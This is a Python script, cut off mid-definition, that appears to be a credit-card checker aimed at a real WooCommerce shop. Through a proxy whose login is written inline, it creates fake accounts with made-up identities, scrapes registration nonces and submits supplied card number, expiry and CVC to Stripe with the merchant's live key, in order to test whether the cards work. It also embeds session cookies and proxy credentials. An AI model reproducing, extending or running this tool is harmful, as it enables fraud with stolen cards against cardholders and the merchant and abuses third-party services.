import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    #elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        #mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)

    headers = {
        'authority': 'www.escaperoomsupplier.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://www.escaperoomsupplier.com/my-account-2/payment-methods/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    response = session.get('https://www.escaperoomsupplier.com/my-account-2/add-payment-method/', headers=headers)
    
    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    print(register)
    
    cookies = {
        'aelia_cs_selected_currency': 'USD',
        'aelia_customer_country': 'TH',
        'quform_session_e73005119e6fd1c85d60be60a8e4ed77': 'FmHHm9Z0n4IHgv7vRvv5n2IHMBONLsU0nk4nBiwU',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-11%2004%3A02%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fpayment-methods%2F',
        'sbjs_first_add': 'fd%3D2026-05-11%2004%3A02%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fpayment-methods%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'wp-wpml_current_language': 'en',
        'pys_first_visit': 'true',
        'pysTrafficSource': 'direct',
        'pys_landing_page': 'https://www.escaperoomsupplier.com/my-account-2/add-payment-method/',
        'last_pysTrafficSource': 'direct',
        'last_pys_landing_page': 'https://www.escaperoomsupplier.com/my-account-2/add-payment-method/',
        '__hstc': '47089912.064db900cb99d9ae2977e6d1f2482103.1778472123873.1778472123873.1778472123873.1',
        'hubspotutk': '064db900cb99d9ae2977e6d1f2482103',
        '__hssrc': '1',
        'pysAddToCartFragmentId': '',
        '__stripe_mid': 'a4c27cc7-c9bf-4902-811c-dc4589703c36991cb0',
        '__stripe_sid': '5d35cd27-c360-445a-ba05-037b9ce966cfc4328a',
        'messagesUtk': 'aa7107474e964f66be85b84161b95d71',
        'cs_viewed_cookie_policy': 'yes',
        'cs_enabled_cookie_term_7107': 'yes',
        'cs_enabled_cookie_term_7111': 'yes',
        'cs_enabled_cookie_term_7109': 'yes',
        'cs_enabled_cookie_term_7108': 'yes',
        'cs_enabled_advanced_matching': 'yes',
        'cs_enabled_server_side': 'yes',
        'cs_user_preference': 'en-cs-yes__cs_enabled_cookie_term_7107-yes__cs_enabled_cookie_term_7111-yes__cs_enabled_cookie_term_7109-yes__cs_enabled_cookie_term_7108-yes__cs_enabled_advanced_matching-yes__cs_enabled_server_side-yes__cs_all_enable-no',
        'CS-Magic': 'eyI3MTA3IjoidHJ1ZSIsIjcxMDgiOiJ0cnVlIiwiNzEwOSI6InRydWUiLCI3MTExIjoidHJ1ZSIsInZlciI6eyIuZXNjYXBlcm9vbXN1cHBsaWVyLmNvbSI6IjEifSwiY3NfZW5hYmxlZF9hZHZhbmNlZF9tYXRjaGluZyI6InRydWUiLCJjc19lbmFibGVkX3NlcnZlcl9zaWRlIjoidHJ1ZSJ9',
        'cs_stored_consent_for': '',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F',
        'pys_session_limit': 'true',
        'pys_start_session': 'true',
        '_ga': 'GA1.1.615480013.1778472135',
        '__hssc': '47089912.2.1778472123874',
        'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rodamuser02@gmail.com%22%2C%22phone%22:%22%22%2C%22fns%22:[]%2C%22lns%22:[]%2C%22emails%22:[%22rodamuser02@gmail.com%22]%2C%22phones%22:[]}',
        '_gcl_au': '1.1.758741280.1778472184',
        '_ga_Z86Q3FY1SD': 'GS2.1.s1778472134$o1$g1$t1778472184$j10$l0$h425778919',
    }
    
    headers = {
        'authority': 'www.escaperoomsupplier.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'aelia_cs_selected_currency=USD; aelia_customer_country=TH; quform_session_e73005119e6fd1c85d60be60a8e4ed77=FmHHm9Z0n4IHgv7vRvv5n2IHMBONLsU0nk4nBiwU; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-11%2004%3A02%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-11%2004%3A02%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; wp-wpml_current_language=en; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.escaperoomsupplier.com/my-account-2/add-payment-method/; last_pysTrafficSource=direct; last_pys_landing_page=https://www.escaperoomsupplier.com/my-account-2/add-payment-method/; __hstc=47089912.064db900cb99d9ae2977e6d1f2482103.1778472123873.1778472123873.1778472123873.1; hubspotutk=064db900cb99d9ae2977e6d1f2482103; __hssrc=1; pysAddToCartFragmentId=; __stripe_mid=a4c27cc7-c9bf-4902-811c-dc4589703c36991cb0; __stripe_sid=5d35cd27-c360-445a-ba05-037b9ce966cfc4328a; messagesUtk=aa7107474e964f66be85b84161b95d71; cs_viewed_cookie_policy=yes; cs_enabled_cookie_term_7107=yes; cs_enabled_cookie_term_7111=yes; cs_enabled_cookie_term_7109=yes; cs_enabled_cookie_term_7108=yes; cs_enabled_advanced_matching=yes; cs_enabled_server_side=yes; cs_user_preference=en-cs-yes__cs_enabled_cookie_term_7107-yes__cs_enabled_cookie_term_7111-yes__cs_enabled_cookie_term_7109-yes__cs_enabled_cookie_term_7108-yes__cs_enabled_advanced_matching-yes__cs_enabled_server_side-yes__cs_all_enable-no; CS-Magic=eyI3MTA3IjoidHJ1ZSIsIjcxMDgiOiJ0cnVlIiwiNzEwOSI6InRydWUiLCI3MTExIjoidHJ1ZSIsInZlciI6eyIuZXNjYXBlcm9vbXN1cHBsaWVyLmNvbSI6IjEifSwiY3NfZW5hYmxlZF9hZHZhbmNlZF9tYXRjaGluZyI6InRydWUiLCJjc19lbmFibGVkX3NlcnZlcl9zaWRlIjoidHJ1ZSJ9; cs_stored_consent_for=; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F; pys_session_limit=true; pys_start_session=true; _ga=GA1.1.615480013.1778472135; __hssc=47089912.2.1778472123874; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rodamuser02@gmail.com%22%2C%22phone%22:%22%22%2C%22fns%22:[]%2C%22lns%22:[]%2C%22emails%22:[%22rodamuser02@gmail.com%22]%2C%22phones%22:[]}; _gcl_au=1.1.758741280.1778472184; _ga_Z86Q3FY1SD=GS2.1.s1778472134$o1$g1$t1778472184$j10$l0$h425778919',
        'origin': 'https://www.escaperoomsupplier.com',
        'referer': 'https://www.escaperoomsupplier.com/my-account-2/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'email': f'rodamuser{nr}@gmail.com',
        'password': 'Gloosmoke@123',
        'mailchimp_woocommerce_newsletter': '1',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': 'https://www.escaperoomsupplier.com/my-account-2/payment-methods/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.escaperoomsupplier.com/my-account-2/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-05-11 04:02:02',
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': f'{register}',
        '_wp_http_referer': '/my-account-2/add-payment-method/',
        'register': 'Register',
    }
    
    response = session.post(
        'https://www.escaperoomsupplier.com/my-account-2/add-payment-method/',
        #cookies=cookies,
        headers=headers,
        data=data,
    )
    
    ajax = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
    print(ajax)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.escaperoomsupplier.com&time_on_page=36164&client_attribution_metadata[client_session_id]=ddcb2d34-4f65-44fc-a70f-09fd12276817&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1HPi1Mwx1EB&client_attribution_metadata[elements_session_config_id]=5fc7cf32-0537-451e-a0b5-e5585d1901f3&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=3061c4fa-b194-4250-9fd1-9445b4e28e75d3693c&muid=a775ba01-637e-4864-86b7-d6283e8bdd2611610a&sid=947198b4-78a6-40bb-8eb7-213dba5e2d8ee88a5c&key=pk_live_51AhcHCJLkLkWRo9VnM36KQasIWiGM5G4h7x2DPjldzFnLjjPgi9Nhsi6Lxcj4ogesCOGLLCUGcoQu8QMV7yYpQ2o00JOOJwP7c&_stripe_version=2025-09-30.clover'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = response.json()['id']
    print(pm)
    
    cookies = {
        'wordpress_sec_e73005119e6fd1c85d60be60a8e4ed77': 'rodamuser01%7C1779681579%7CjoROlmluO8QKHn5JPjnUf4UJ7OsB2kpWajFyiV5jZ3n%7C53a0893732fadb41b0fb3006786d560ceab1c8bd6622d74adb3f9dc898bcfb09',
        'aelia_cs_selected_currency': 'USD',
        'aelia_customer_country': 'TH',
        'quform_session_e73005119e6fd1c85d60be60a8e4ed77': 'P9yPZL1kIeeXSa5yNNaybAwWGbGNAwyKv3WH4TPd',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-11%2003%3A59%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_first_add': 'fd%3D2026-05-11%2003%3A59%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'wp-wpml_current_language': 'en',
        'pys_first_visit': 'true',
        'pysTrafficSource': 'google.com',
        'pys_landing_page': 'https://www.escaperoomsupplier.com/my-account/',
        'last_pys_landing_page': 'https://www.escaperoomsupplier.com/my-account/',
        '__hstc': '47089912.9793f1d9b065bf58b5c5e9aca80487ed.1778471953930.1778471953930.1778471953930.1',
        'hubspotutk': '9793f1d9b065bf58b5c5e9aca80487ed',
        '__hssrc': '1',
        'cs_viewed_cookie_policy': 'yes',
        'cs_enabled_cookie_term_7107': 'yes',
        'cs_enabled_cookie_term_7111': 'yes',
        'cs_enabled_cookie_term_7109': 'yes',
        'cs_enabled_cookie_term_7108': 'yes',
        'cs_enabled_advanced_matching': 'yes',
        'cs_enabled_server_side': 'yes',
        'cs_user_preference': 'en-cs-yes__cs_enabled_cookie_term_7107-yes__cs_enabled_cookie_term_7111-yes__cs_enabled_cookie_term_7109-yes__cs_enabled_cookie_term_7108-yes__cs_enabled_advanced_matching-yes__cs_enabled_server_side-yes__cs_all_enable-no',
        'CS-Magic': 'eyI3MTA3IjoidHJ1ZSIsIjcxMDgiOiJ0cnVlIiwiNzEwOSI6InRydWUiLCI3MTExIjoidHJ1ZSIsInZlciI6eyIuZXNjYXBlcm9vbXN1cHBsaWVyLmNvbSI6IjEifSwiY3NfZW5hYmxlZF9hZHZhbmNlZF9tYXRjaGluZyI6InRydWUiLCJjc19lbmFibGVkX3NlcnZlcl9zaWRlIjoidHJ1ZSJ9',
        '_ga': 'GA1.1.1193901252.1778471955',
        'pysAddToCartFragmentId': '',
        'cs_stored_consent_for': '',
        'messagesUtk': 'bb277534f282463a910fd3d24c12639a',
        'pys_session_limit': 'true',
        'pys_start_session': 'true',
        'last_pysTrafficSource': 'direct',
        'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rodamuser01@gmail.com%22%2C%22phone%22:%22%22%2C%22fns%22:[]%2C%22lns%22:[]%2C%22emails%22:[%22rodamuser01@gmail.com%22]%2C%22phones%22:[]}',
        '_gcl_au': '1.1.1183503560.1778471976',
        'wordpress_logged_in_e73005119e6fd1c85d60be60a8e4ed77': 'rodamuser01%7C1779681579%7CjoROlmluO8QKHn5JPjnUf4UJ7OsB2kpWajFyiV5jZ3n%7C5eeab8ea446563e38e456e3148c8dfe995b9cfb495e4349aae418929d5791a0b',
        'wfwaf-authcookie-c9b93e681e14a591e6ca96acb2e1840d': '5568%7Cother%7Cread%7C404fcc3995a057af4c1c231a7860e34137dd21ad9527de28704a71b8b2947d43',
        '__stripe_mid': 'a775ba01-637e-4864-86b7-d6283e8bdd2611610a',
        '__stripe_sid': '947198b4-78a6-40bb-8eb7-213dba5e2d8ee88a5c',
        'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F',
        '__hssc': '47089912.5.1778471953932',
        '_ga_Z86Q3FY1SD': 'GS2.1.s1778471954$o1$g1$t1778472034$j55$l0$h1908208599',
    }
    
    headers = {
        'authority': 'www.escaperoomsupplier.com',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wordpress_sec_e73005119e6fd1c85d60be60a8e4ed77=rodamuser01%7C1779681579%7CjoROlmluO8QKHn5JPjnUf4UJ7OsB2kpWajFyiV5jZ3n%7C53a0893732fadb41b0fb3006786d560ceab1c8bd6622d74adb3f9dc898bcfb09; aelia_cs_selected_currency=USD; aelia_customer_country=TH; quform_session_e73005119e6fd1c85d60be60a8e4ed77=P9yPZL1kIeeXSa5yNNaybAwWGbGNAwyKv3WH4TPd; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-11%2003%3A59%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-05-11%2003%3A59%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; wp-wpml_current_language=en; pys_first_visit=true; pysTrafficSource=google.com; pys_landing_page=https://www.escaperoomsupplier.com/my-account/; last_pys_landing_page=https://www.escaperoomsupplier.com/my-account/; __hstc=47089912.9793f1d9b065bf58b5c5e9aca80487ed.1778471953930.1778471953930.1778471953930.1; hubspotutk=9793f1d9b065bf58b5c5e9aca80487ed; __hssrc=1; cs_viewed_cookie_policy=yes; cs_enabled_cookie_term_7107=yes; cs_enabled_cookie_term_7111=yes; cs_enabled_cookie_term_7109=yes; cs_enabled_cookie_term_7108=yes; cs_enabled_advanced_matching=yes; cs_enabled_server_side=yes; cs_user_preference=en-cs-yes__cs_enabled_cookie_term_7107-yes__cs_enabled_cookie_term_7111-yes__cs_enabled_cookie_term_7109-yes__cs_enabled_cookie_term_7108-yes__cs_enabled_advanced_matching-yes__cs_enabled_server_side-yes__cs_all_enable-no; CS-Magic=eyI3MTA3IjoidHJ1ZSIsIjcxMDgiOiJ0cnVlIiwiNzEwOSI6InRydWUiLCI3MTExIjoidHJ1ZSIsInZlciI6eyIuZXNjYXBlcm9vbXN1cHBsaWVyLmNvbSI6IjEifSwiY3NfZW5hYmxlZF9hZHZhbmNlZF9tYXRjaGluZyI6InRydWUiLCJjc19lbmFibGVkX3NlcnZlcl9zaWRlIjoidHJ1ZSJ9; _ga=GA1.1.1193901252.1778471955; pysAddToCartFragmentId=; cs_stored_consent_for=; messagesUtk=bb277534f282463a910fd3d24c12639a; pys_session_limit=true; pys_start_session=true; last_pysTrafficSource=direct; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rodamuser01@gmail.com%22%2C%22phone%22:%22%22%2C%22fns%22:[]%2C%22lns%22:[]%2C%22emails%22:[%22rodamuser01@gmail.com%22]%2C%22phones%22:[]}; _gcl_au=1.1.1183503560.1778471976; wordpress_logged_in_e73005119e6fd1c85d60be60a8e4ed77=rodamuser01%7C1779681579%7CjoROlmluO8QKHn5JPjnUf4UJ7OsB2kpWajFyiV5jZ3n%7C5eeab8ea446563e38e456e3148c8dfe995b9cfb495e4349aae418929d5791a0b; wfwaf-authcookie-c9b93e681e14a591e6ca96acb2e1840d=5568%7Cother%7Cread%7C404fcc3995a057af4c1c231a7860e34137dd21ad9527de28704a71b8b2947d43; __stripe_mid=a775ba01-637e-4864-86b7-d6283e8bdd2611610a; __stripe_sid=947198b4-78a6-40bb-8eb7-213dba5e2d8ee88a5c; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.escaperoomsupplier.com%2Fmy-account-2%2Fadd-payment-method%2F; __hssc=47089912.5.1778471953932; _ga_Z86Q3FY1SD=GS2.1.s1778471954$o1$g1$t1778472034$j55$l0$h1908208599',
        'origin': 'https://www.escaperoomsupplier.com',
        'referer': 'https://www.escaperoomsupplier.com/my-account-2/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
